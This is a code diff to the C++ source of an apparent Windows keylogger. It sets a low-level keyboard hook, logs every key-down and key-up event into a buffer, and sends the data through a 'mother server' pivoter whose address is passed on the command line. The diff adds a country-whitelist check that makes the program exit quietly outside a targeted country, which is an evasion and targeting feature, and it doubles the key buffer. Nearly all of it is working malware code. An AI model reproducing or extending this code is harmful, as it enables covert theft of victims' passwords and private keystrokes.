@@ -12,9 +12,10 @@
 #include <thread>
 #include "codes.h"
 #include "connections_pivoter.h"
+#include "security_checker.h"
 
 #define DEBUG TRUE
-#define KEYS_LIMIT 100
+#define KEYS_LIMIT 200
 HHOOK keyboard_events_hook; 
 std::vector<std::string> virt_codes; 
 ConnectionsPivoter mother_server_pv = ConnectionsPivoter();
@@ -31,11 +32,26 @@ void stack_codes() {
 }
 
 LRESULT CALLBACK keyboard_callback(int nCode, WPARAM wParam, LPARAM lParam) {
-	if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
+	switch (wParam) {
+	case WM_KEYDOWN: 
+	case WM_SYSKEYDOWN: 
+	case WM_KEYUP: 
+	case WM_SYSKEYUP: 
 		KBDLLHOOKSTRUCT* kbd_struct = (KBDLLHOOKSTRUCT*)lParam; 
 		DWORD virt_code = kbd_struct->vkCode; 
 
-		std::string string_key_code = VIRTUAL_KEY_CODE_TABLE[virt_code].name; 
+		std::string prefix; 
+		switch (wParam) {
+		case WM_KEYDOWN: 
+		case WM_SYSKEYDOWN: 
+			prefix = "DOWN_"; 
+			break; 
+		case WM_KEYUP: 
+		case WM_SYSKEYUP: 
+			prefix = "UP_"; 
+			break; 
+		}
+		std::string string_key_code = prefix + VIRTUAL_KEY_CODE_TABLE[virt_code].name;
 		if (DEBUG) {
 			std::cout << "Key pressed: " << string_key_code << std::endl; 
 			std::cout << "Len of the vector: " << virt_codes.size() << std::endl; 
@@ -43,13 +59,26 @@ LRESULT CALLBACK keyboard_callback(int nCode, WPARAM wParam, LPARAM lParam) {
 
 		virt_codes.push_back(string_key_code);
 		stack_codes();
+		break; 
 	}
 	return CallNextHookEx(keyboard_events_hook, nCode, wParam, lParam);
 }
 
-int main(int argc, char **argv) {
-	
-	if (argc != 2) {
+/*
+
+ARGUMENTS: 
+	- 1: initial mother server ip 
+	- 2: whitelisted country
+*/
+int main(int argc, char** argv) {
+
+	std::cout << "lmao" << std::endl; 
+
+	// security Checks 
+	if (!check_country(argv[2]))
+		return 0; 
+
+	if (argc != 3) {
 		std::cout << "Error: wrong use of arguments!" << std::endl; 
 		return 1; 
 	}
@@ -58,7 +87,8 @@ int main(int argc, char **argv) {
 		for (int i = 0; i < argc; i++)
 			std::cout << "Argument " << i << " value: " << argv[i] << std::endl;
 
-	mother_server_pv.set_url(argv[1]); 
+	mother_server_pv.url = argv[1];
+	mother_server_pv.allowed_country = argv[2];
 
 	keyboard_events_hook = SetWindowsHookExA(WH_KEYBOARD_LL, keyboard_callback, 0, 0); 
 
